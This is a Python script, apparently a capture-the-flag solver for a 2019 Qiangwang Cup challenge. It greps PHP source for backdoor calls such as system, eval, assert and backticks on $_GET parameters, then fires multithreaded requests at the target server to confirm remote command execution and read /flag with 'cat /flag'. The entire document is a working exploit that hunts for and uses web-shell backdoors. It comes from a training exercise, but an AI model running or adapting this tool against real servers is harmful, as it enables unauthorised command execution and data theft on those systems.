#!/usr/bin/env python3
import sys
import os
import re
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.stdout.reconfigure(line_buffering=True)

BASE_URL = "http://904c5bf5-7217-4f7f-959b-c0a319b2a1ff.node5.buuoj.cn:81"
DELAY = 0.3
THREADS = 3

session = requests.Session()

def find_executable_params(filepath):
    """找到所有可能被执行的参数（没有被覆盖的）"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    results = []

    # 找到所有危险调用位置
    dangerous_patterns = [
        (r'echo\s*`\s*\{\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\}\s*`', 'backtick'),
        (r'system\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'system'),
        (r'passthru\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'passthru'),
        (r'exec\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'exec'),
        (r'shell_exec\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'shell_exec'),
        (r'assert\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'assert'),
        (r'eval\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'eval'),
        (r'@preg_replace\s*\([^)]*\/e[^)]*,\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]', 'preg_replace'),
    ]

    for pattern, exec_type in dangerous_patterns:
        for match in re.finditer(pattern, content):
            param_name = match.group(1)
            exec_pos = match.start()

            # 检查这个参数是否在执行之前被覆盖
            # 找到所有对这个参数的赋值
            assign_pattern = rf"\$_GET\s*\[\s*['\"]({re.escape(param_name)})['\"]\s*=\s*"
            assignments = [m.start() for m in re.finditer(assign_pattern, content)]

            # 如果没有赋值，或者所有赋值都在执行之后，则这个参数可用
            is_overwritten_before = any(pos < exec_pos for pos in assignments)

            if not is_overwritten_before:
                results.append((param_name, exec_type))

    return results

def test_param(filename, param):
    """测试单个参数是否可执行命令"""
    marker = f"MARKER_{filename[:6]}_{param[:8]}"
    url = f"{BASE_URL}/{filename}?{param}=echo%20{marker}"

    try:
        r = session.get(url, timeout=10)
        if r.status_code == 429:
            print(f"[429] Rate limited, waiting...")
            time.sleep(30)
            return None
        time.sleep(DELAY)

        if marker in r.text:
            return (filename, param, True)
        return (filename, param, False)
    except Exception as e:
        return (filename, param, False)

def main():
    src_dir = "/home/kali/workspace/challenges/154_强网杯_2019_高明的黑客/src"

    all_tests = []
    php_files = [f for f in os.listdir(src_dir) if f.endswith('.php')]
    print(f"[*] Found {len(php_files)} PHP files")

    for php_file in php_files:
        filepath = os.path.join(src_dir, php_file)
        params = find_executable_params(filepath)
        for param, exec_type in params:
            all_tests.append((php_file, param, exec_type))

    print(f"[*] Total {len(all_tests)} params to test (filtered for non-overwritten)")
    print(f"[*] Starting dynamic test with {THREADS} threads, {DELAY}s delay...")

    found = []
    tested = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(test_param, f, p): (f, p, t) for f, p, t in all_tests}

        for future in as_completed(futures):
            tested += 1
            result = future.result()
            if result and result[2]:
                found.append((result[0], result[1]))
                print(f"\n[+] FOUND: {result[0]}?{result[1]}=echo MARKER")
                flag_url = f"{BASE_URL}/{result[0]}?{result[1]}=cat%20/flag"
                try:
                    r = session.get(flag_url, timeout=10)
                    print(f"[+] Flag response:\n{r.text[:500]}")
                except Exception as e:
                    print(f"[-] Error getting flag: {e}")

            if tested % 50 == 0:
                print(f"[*] Progress: {tested}/{len(all_tests)} ({100*tested/len(all_tests):.1f}%)")

    print(f"\n[*] Test completed. Found {len(found)} working backdoors:")
    for f, p in found:
        print(f"    {f}?{p}=command")

if __name__ == "__main__":
    main()
